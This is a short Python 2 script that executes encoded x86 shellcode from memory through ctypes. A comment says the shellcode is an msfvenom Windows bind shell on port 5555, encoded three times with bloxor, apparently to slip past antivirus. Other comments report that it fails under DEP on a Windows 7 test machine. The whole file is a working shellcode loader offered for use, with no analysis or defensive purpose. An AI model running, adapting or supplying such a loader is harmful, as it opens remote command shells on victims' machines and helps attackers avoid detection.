#!/usr/bin/env python2
from ctypes import *

# NO DEP
# Doesn't work on my test box (Win 7 x86 SP1);  
# Complains about Access violation trying to write to addy 0x? whatever
# see AEP_revshell_win_dep.py instead

sc = ("\xe8\x00\x00\x00\x00\x5f\x6a\x05\x5a\x29\xd7\x81\xef\xc2\xff"
"\xff\xff\x57\x5e\x6a\x02\x03\x34\x24\x5a\x31\xdb\x66\xbb\xf1"
"\x00\x8b\x06\xc1\xe0\x10\xc1\xe8\x10\x83\xc6\x02\x0f\xb7\x2f"
"\x31\xc5\x66\x89\x2f\x8d\x7f\x02\x4b\x85\xdb\x0f\x85\xe1\xff"
"\xff\xff\x86\xb8\x5f\x4e\x0b\x15\xd2\x66\x26\x3c\x4c\x79\x4f"
"\x6d\x6b\x36\xe2\xe3\x6f\x8e\x6d\x30\xa0\x30\xa0\x30\xaf\x87"
"\xe2\x87\x63\x6a\x9d\x95\x62\x6a\xe9\x50\x28\xb7\x38\x76\xd7"
"\x66\x5e\x9d\x57\x56\x76\x99\x81\x4e\xa0\x91\xc6\xc6\xa0\x49"
"\xa2\xc4\xf0\xc6\xbe\x43\x48\x4c\xcd\x9f\x32\x60\xcd\x67\x00"
"\xbb\x1f\x33\x5a\x62\x6d\xc7\x02\x4f\xdc\x38\xfd\xb0\x8c\x63"
"\x7c\x5b\x72\x9c\x83\xa4\x1a\x38\x83\xa4\x1a\x67\x7c\x97\x44"
"\xa6\x9a\x87\x85\x48\x8a\xed\x87\x4b\x96\xc9\xdd\xc0\xbe\x08"
"\x38\xd0\x7f\xe5\x28\x59\x95\xec\xda\x78\x60\x1b\x0f\x59\xb5"
"\x7d\x5a\x3f\x3a\x7d\x77\xc1\xc5\x82\x88\x8e\x40\x7d\x87\x0b"
"\x8c\x82\x78\xf4\x4d\xe0\x45\x7e\xf2\x6a\xfa\xf4\x2d\x69\xc0"
"\xc6\xd7\x3f\xb1\xc0\x96\xb2\xa2\x41\x0e\x61\x2e\x19\xf0\x11"
"\xdf\xde\x4b\xf0\x55\xc0\x6d\xd2\x12\x9e\x28\xa0\x77\x2d\x82"
"\x1e\xdc\x54\xcb\x95\xc7\x88\x5b\x1b\x47\x8d\x91\x22\x06\xf8"
"\xc1\x2f\xb5\xbd\x73\xbb\x56\xa2\xc9\x84\xed\x4e\xf9\x21\xc5"
"\x08\xeb\x2e\x5c\x33\xf9\x14\x98\x38\xc2\xb3\x62\x50\x35\xda"
"\x52\x01\xe5\xfe\x74\x26\xbe\x21\x14\x84\xfa\xf6\xb4\x0b\xd1"
"\x21\xbb\xdd\x0d\x91\xec\x61\x11\xa6\xa8\x4a\x54\x5e\x66\xb6"
"\x11\xa3\xf3\xc2\xc0\xf3\x06\xc9\x6e\x99\xf1\xf9\xc8\x56\xb7"
"\x69\xd1\x9c\x25\xb1\xa8\xc9\x01\x8c\xbf\xc6\x16\x83\xc0\xbe"
"\x1a\xc9\x93\xa0\x21\x9b\xdf\xd4\x6a\x10\x41\xe7\x64\x22\x4f"
"\xd5\x43\xd4\x3c\x73\x58\x5b\xa7\x97\xc3\x40\xe9\xe6\x85\x68"
"\xff\x2c\x6e\xe2\x44\xe6\x85\x40\x45\x4b\x5b\x0d\x64\xd3\xed"
"\xfd\xd0\x23\x4c\xbe\xf8\x86\x0e\x0b\xec\x64\x72\x2b\x4b\x73"
"\xb2\xc3\x5e\xcc\xcf\xcb\xca\xfc\xa4\x04\x74\x64\x72\xe8\x4e"
"\xb3\xa9\xc0\x40\xcc\x30\xd7\xac\xb5\x91\xcf\xf2\x78\xa7\x61"
"\xa9\xb2\xfc\x22\x11\xa6\x13\x61\xcf\x13\xa7\xc6\x22\xe2\xa8"
"\xca\x4b\x29\x85\x25\x5a\xc7\x95\x46\x0e\x80\xd1\xc7\x4a\x45"
"\xc1\x52\x0c\x86\xd1\xd7\x4a\x4d\xc1\x4a\x09\x86\xea\xf8\xee"
"\x0b\x8b\x8a\x5a\xf0\xdf\x3f\x58\x03\x22\xfc\xcd\xc8\x30\x2a"
"\xbf\xe1\x97\xb8\xe8\xc6\x62\xc9\x75\x11\x6a\xa3\xe0\x84\x2a"
"\x0a\xa6\x51\x66\x5f\x11\xe4\xa4\xef\x68\x13\xce\x6a\x6d\xfc"
"\xcb\xd6\x97\x95\xa5\x62") # len 546
# msfvenom -p windows/shell_bind_tcp LPORT=5555 -e x86/bloxor -i 3 -f c

code = create_string_buffer(sc, len(sc))
shell = cast(code, CFUNCTYPE(c_void_p))
shell()


